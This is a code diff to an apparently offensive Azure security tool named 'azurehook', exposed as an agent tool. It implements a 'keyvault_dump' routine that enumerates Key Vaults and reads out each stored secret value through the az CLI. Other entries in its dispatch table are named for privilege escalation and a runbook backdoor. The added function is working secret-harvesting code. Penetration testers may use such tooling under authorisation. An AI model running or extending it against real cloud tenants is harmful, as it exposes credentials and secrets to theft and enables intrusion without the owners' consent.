@@ -153,6 +153,42 @@ async function entraPrivesc(args: string[], timeout: number): Promise<HookResult
   return { output: `ERROR: Unknown method: ${method}`, findings: [] }
 }
 
+async function keyvaultDump(args: string[], timeout: number): Promise<HookResult> {
+  const sub = argVal(args, "--subscription-id")
+  const vaultName = argVal(args, "--vault-name")
+
+  if (vaultName) {
+    const output = [`[*] Key Vault dump: ${vaultName}\n`]
+    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", vaultName, "-o", "json"], timeout)
+    if (secrets.exitCode === 0) {
+      const sl = tryJson(secrets.stdout) || []
+      output.push(`[+] Secrets: ${sl.length}`)
+      for (const s of sl) {
+        const name = s.id?.split("/").pop() || s.name
+        const val = await run("az", ["keyvault", "secret", "show", "--vault-name", vaultName, "--name", name, "--query", "value", "-o", "tsv"], timeout)
+        if (val.exitCode === 0) output.push(`[+] ${name}: ${val.stdout.trim().slice(0, 80)}${val.stdout.length > 80 ? "..." : ""}`)
+        else output.push(`[-] ${name}: access denied`)
+      }
+    }
+    const keys = await run("az", ["keyvault", "key", "list", "--vault-name", vaultName, "-o", "json"], timeout)
+    if (keys.exitCode === 0) output.push(`[+] Keys: ${(tryJson(keys.stdout) || []).length}`)
+    const certs = await run("az", ["keyvault", "certificate", "list", "--vault-name", vaultName, "-o", "json"], timeout)
+    if (certs.exitCode === 0) output.push(`[+] Certificates: ${(tryJson(certs.stdout) || []).length}`)
+    return { output: output.join("\n"), findings: [] }
+  }
+
+  const vaults = await az(["keyvault", "list", "--query", "[].{name:name,rg:resourceGroup}"], sub, timeout)
+  if (vaults.exitCode !== 0) return { output: `[-] Cannot list vaults: ${vaults.stderr.trim()}`, findings: [] }
+  const vl = tryJson(vaults.stdout) || []
+  const output = [`[*] Found ${vl.length} Key Vault(s)\n`]
+  for (const v of vl) {
+    const secrets = await run("az", ["keyvault", "secret", "list", "--vault-name", v.name, "-o", "json"], timeout)
+    const count = secrets.exitCode === 0 ? (tryJson(secrets.stdout) || []).length : "denied"
+    output.push(`[${count === "denied" ? "-" : "+"}] ${v.name}: ${count} secret(s)`)
+  }
+  return { output: output.join("\n"), findings: [] }
+}
+
 // ── Tool definition ──
 
 const programKeys = Object.keys(PROGRAMS) as [Program, ...Program[]]
@@ -184,7 +220,7 @@ export const AzurehookTool = Tool.define("azurehook", {
     const dispatch: Record<Program, () => Promise<HookResult>> = {
       entra_enum: () => entraEnum(params.args, params.timeout_seconds),
       entra_privesc: () => entraPrivesc(params.args, params.timeout_seconds),
-      keyvault_dump: () => stub("keyvault_dump"),
+      keyvault_dump: () => keyvaultDump(params.args, params.timeout_seconds),
       storage_dump: () => stub("storage_dump"),
       managed_identity: () => stub("managed_identity"),
       runbook_backdoor: () => stub("runbook_backdoor"),
